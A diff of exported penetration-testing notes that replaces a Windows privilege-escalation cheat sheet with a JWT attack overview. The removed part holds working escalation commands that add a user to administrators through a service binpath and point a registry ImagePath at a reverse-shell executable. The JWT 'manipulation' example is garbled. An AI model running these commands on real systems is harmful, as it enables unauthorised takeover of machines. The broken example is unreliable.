@@ -1,4 +1,4 @@
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Service Permissions (Paths)</title><style>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>JSON Web Tokens (JWT)</title><style>
 /* cspell:disable-file */
 /* webkit printing magic: print all background colors */
 html {
@@ -666,29 +666,34 @@ blockquote {
 	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
 }
 	
-</style></head><body><article id="fb35617e-95ee-409d-a517-c3e3303a9456" class="page sans"><header><h1 class="page-title">Service Permissions (Paths)</h1></header><div class="page-body"><p id="ed3787e4-0ec5-4a60-9e30-3575c28d127e" class="">Insecure Service Permissions:</p><ul id="dbd65238-48ff-4041-a9fa-c938fc41db25" class="bulleted-list"><li style="list-style-type:disc">must be able to start/stop service or restart machine</li></ul><pre id="244469a5-b96f-4c1b-ae52-4fa1e6c8e103" class="code"><code>.\accesschk.exe /accepteula -uwcqv user &lt;service-found&gt;
-sc qc &lt;service-found&gt;
-sc query &lt;service-found&gt;</code></pre><p id="31b561cb-f956-4337-a511-346de5e214c6" class="">
-</p><p id="3e5564c6-dd0e-48e9-8107-55b2358e9c4a" class=""><strong>Binary Paths:</strong></p><p id="05cb546b-a6e0-4e84-b3bb-1c09b341ee62" class="">Powerup method (easy):</p><pre id="9896f129-1b05-4fa8-b384-8aee89f346e0" class="code"><code>powershell -ep bypass
-. .\PowerUp.ps1
-Invoke-AllChecks
-#finds service permissions</code></pre><p id="4362c780-f2d5-4d6e-942d-c2eb99da3e3b" class="">Accesschk64.exe:</p><pre id="191c580f-c994-424b-be16-4bc1a689aed6" class="code"><code>Accesschk64.exe -uwcv Everyone *
-Accesschk64.exe -uwcv &lt;service-found&gt;
-sc qc &lt;service-found&gt;
-sc config &lt;service-found&gt; binpath= &quot;net localgroup administrators user /add&quot;
-sc start &lt;service-found&gt;</code></pre><p id="97133573-b678-4756-b4e7-861e33ae0b39" class="">
-</p><p id="96f9afa1-dfdd-46d0-9ac1-f2cbd7ea3229" class=""><strong>Unquoted Service Paths:</strong></p><p id="04d6bd48-e82a-4278-b544-0d6fb96cf03a" class="">Powerup method (easy):</p><pre id="05910add-da54-41b7-b3ec-544b38f6da9f" class="code"><code>powershell -ep bypass
-. .\PowerUp.ps1
-Invoke-AllChecks
-#finds unqouted services</code></pre><p id="81d7c026-67de-40b4-84d2-45fb7aec2569" class="">
-</p><p id="db6f05b6-d2e7-47d5-a46a-8b5fd442556c" class="">Once found add a malicious executable where the cut off service exists for it to be run…</p><p id="cd30d37f-5987-4b97-9db2-2ddef262e512" class="">restart program/machine…</p><p id="1f2e3980-aa04-46fe-b7ba-02c4f03a6bc3" class="">
-</p><p id="efcb965c-232e-43ea-bc80-f9427a3af8aa" class="">
-</p><p id="2130a336-35aa-4231-a1ba-6f05309e6403" class=""><strong>Weak Registry Permissions:</strong></p><pre id="385eba8e-ca8b-4c32-a235-1fd52c713cf6" class="code"><code>#modifiable registry permissions found on winpeas
-powershell -exec bypass
-Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc # the registry found
-.\accesschk.exe /accepteula -uwcqv HKLM:\System\CurrentControlSet\Services\regsvc
-.\accesschk.exe /accepteula -uwcqv user regsvc
-reg query HKLM:\System\CurrentControlSet\Services\regsvc
-reg add HKLM:\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\reverse.exe /f
-net start regsvc</code></pre><p id="76d6f75f-5417-485f-a28a-04368d43429c" class="">
-</p></div></article></body></html>
+</style></head><body><article id="4af78d6b-33c7-47c4-b0ef-117daa8ed03f" class="page sans"><header><h1 class="page-title">JSON Web Tokens (JWT)</h1></header><div class="page-body"><ul id="3f463fda-c22c-4cdb-927f-1eaccf114f78" class="bulleted-list"><li style="list-style-type:disc">JWT.io</li></ul><ul id="1baf3f5a-35e1-4e4c-8e60-e64c14235f90" class="bulleted-list"><li style="list-style-type:disc">JWT are comprised of a header, body, and a encryption key. <ul id="a3be9e86-65a5-425c-b354-97929d291500" class="bulleted-list"><li style="list-style-type:circle">We can learn about the data within the token if we have the key.</li></ul></li></ul><p id="fcbc90d4-062e-4bc7-a2ae-cda97a65837c" class="">
+</p><p id="599ab2f5-a6fa-497b-ac3c-f3b58460593c" class=""><strong>Header - </strong>Used to describe encryption algorithm is being used. Several popular options exist and most of them require a key as well.</p><p id="cd8de495-b562-48ad-b12d-b269a8f8dc07" class="">
+</p><p id="af214502-e35e-4be9-ba20-e41671ddfc82" class=""><strong>Body - </strong> Usually describes certain properties of a user. This can be information we might want to change to test the authorization module.</p><p id="6b595389-db28-449d-803c-06424b1d6455" class="">
+</p><p id="ab596e71-41c0-47f8-9bb5-2d92d32e86ef" class=""><strong>Key - </strong> If you get this wrong, the server will never accept your JWT; but if you are able to get the key and encode the value that is equally a very bad problem.</p><p id="ff10fc6f-1f07-4f68-aeac-642b3b08683e" class="">
+</p><p id="f97511a5-c082-43e9-822a-4c5cbae67d6f" class="">
+</p><h2 id="028b6a66-ae2c-441e-b384-9314bef3665c" class=""><strong>Common attacks:</strong></h2><p id="ea884c46-0121-4653-9012-6076398e340d" class=""><strong>Hashing algorithm none - W</strong>hen the server accepts JWT tokens with the header that indicated the use of no key. This will allow us to easily forge any token we want.</p><p id="c2500eb3-6fcc-443e-9679-bc7cfc0c149a" class="">
+</p><p id="a34aa286-bdca-48f1-a18f-6c27c513531d" class=""><strong>JWT manipulation - </strong>Sometimes, user controlled values end up in a JWT token. This should never ever be the case but since some application abuse JWT tokens for authentication rather than authorization, we can still play with the contents of the JWT by changing the username to something that interrupts the current JWT structure and insert our own. This means we might be able to change values and make ourselves admin or even login as other users if the system is built in a bad way.</p><p id="547e587d-5c1b-4f62-b940-4042670e8a81" class="">i.e.</p><pre id="a68e275a-854c-46e7-9299-a7ccadb5201e" class="code"><code>{
+
+&quot;username&quot;:&quot;attack&quot;,
+
+&quot;isAdmin&quot;:&quot;false&quot;
+
+}
+
+Might turn into
+
+{
+
+&quot;username&quot;:&quot;attack&quot;,
+
+&quot;isAdmin&quot;:&quot;false&quot;
+
+}
+
+&quot;isAdmin&quot;:&quot;false&quot;
+
+}</code></pre><p id="e2c0994f-a6d3-42c7-8d54-0f2ea6699262" class="">
+</p><p id="7b48af42-2057-4387-8ede-ead7bfbe3099" class="">
+</p><p id="935be593-f16b-4394-996c-ac1435148704" class=""><strong>Token side jacking - </strong>This exploit is basically intercepting the token/key and using it to sign a valid JWT. This can be very basic like a leaked token on the source code of a website. This can be prevented and we will get more into that into another article.</p><p id="d0a61c6b-301e-4746-a6ca-c824204a1eb0" class="">
+</p><p id="6f83ae41-340e-47d2-ba15-854ce32a6c1d" class=""><strong>Weak token secrets - </strong>Of course just like with any key, this one is vulnerable to being weak and easy to brute force so pick a solid key and make sure it does not leak.</p><p id="3df99785-908c-489c-bf33-409676c24a58" class="">
+</p><p id="affbaa61-543a-4adb-a9b3-a5024e6a5e82" class=""><strong>Longlasting tokens - </strong>Normally, every token contains an expiration field. Usually it’s called “exp” but it might be called something different. Make sure the server actually disregards any JWTs that are no longer valid.</p></div></article></body></html>
